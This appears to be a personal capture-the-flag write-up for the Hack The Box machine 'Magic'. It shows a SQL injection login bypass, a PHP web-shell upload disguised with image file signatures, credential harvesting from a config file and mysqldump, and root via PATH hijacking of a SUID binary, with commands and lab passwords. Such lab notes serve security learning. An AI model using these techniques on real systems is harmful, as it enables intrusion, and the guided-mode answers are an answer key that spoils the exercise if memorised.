## Magic -Linux Machine

- [+] : Target IP 
	>> 10.10.10.185
### Adventure Mode

## Recon
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

## Foothold

- [+] : Sql injection in login ' OR 1=1 -- 

- [+] : Trying to upload a php revshell for now , cant bypass png with .php.png for some reason
      >>https://rcenetsec.com/hide-malicious-shell-in-image-file/

- [+] : uploading files lists them in in /images/uploads/
## Uploading file 
- [+] : good source of list of file signatures -> https://en.wikipedia.org/wiki/List_of_file_signatures
      >>474946383761 
- [+] : hexedit is a good tool to play with hexadecimals 
      >>make sure to leave so 8 lines , for the 8 octet that u gonna add so that the file signature counts and the <?php doesnt get deleted 

## User www-data recon
- [+] : netstat -aop 
localhost:mysql

- [+] : found db.php5
```php
	class Database
	{
	    private static $dbName = 'Magic' ;
	    private static $dbHost = 'localhost' ;
	    private static $dbUsername = 'theseus';
	    private static $dbUserPassword = 'iamkingtheseus';
	}
```

- [+] : mysql doesnt work , can chisel the port but i prefered not to and check for more

      >>find / -name "*mysql*" 2>/dev/null  shows mysqldump 
      >>mysqldump --all-databases -u 'theseus' -p 
      >>Th3s3usW4sK1ng
      
## User theseus

      >>sudo /usr/sbin/pppd connect $PWD/id.sh
      >>[sudo] password for theseus: 
      >>theseus is not in the sudoers file.  This incident will be reported.

- [+] : find / -perm -4000 -exec -ls -l {} \; 2>/dev/null  [fetches SUID files , stores em in {} and for each line in brackets executes an ls on it ]

/- [+] : bin/sysinfo readable only by me made by root

- [+] : Chatgpt goat here ngl -> strings the /bin/sysinfo shows that there are couple of commands used in sysinfo , cat free fdisk lswh , potential exploit were to execute these commands as root due to suid .

## Path Hijacking 
- [+] : if sysinfo uses relative paths for executing command we are able to exploit this by manipulatin PATH env var

theseus@magic:~/Desktop$ echo '/bin/bash' > /tmp/lshw [Created new script called lshw spawning /bin/bash through sudo]
theseus@magic:~/Desktop$ chmod +x /tmp/lshw
theseus@magic:~/Desktop$ export PATH=/tmp:$PATH [tells path to start fetching from tmp ]
theseus@magic:~/Desktop$ /bin/sysinfo

- [+] : And we root !
      >>for some reason cant see output for results , just bash revshell again 

## Guided Mode
- [+] : How many open TCP ports are listening on Magic?
	>> 2

- [+] : What is the relative path of the page on the webserver that a user is redirected to on successfully logging in?
	>> /upload.php

- [+] : The site claims that only three file extensions are allowed to be uploaded. They are jpg, jpeg, and what?
	>> png

- [+] : What is the relative path of the directory that uploaded images are saved in?
	>> /images/uploads

- [+] : Will the Apache directive <FilesMatch ".+\.php"> only match on files ending with .php?
	>> no

- [+] : What user is the webserver running as?
	>> www-data

- [+] : What is the theseus user's password for MySQL?
	>> iamkingtheseus

- [+] : What is the theseus user's password on Magic?
	>> Th3s3usW4sK1ng

- [+] : What is the full path of the binary that is custom to Magic and configured with the SetUID bit on?
	>> /bin/sysinfo

- [+] : What Linux binary is called by sysinfo to get the Hardware Info?
	>> lshw

- [+] : What Bash environment variable can we modify for our current session to change which binary is called by sysinfo? Don't include a leading $.
	>> PATH

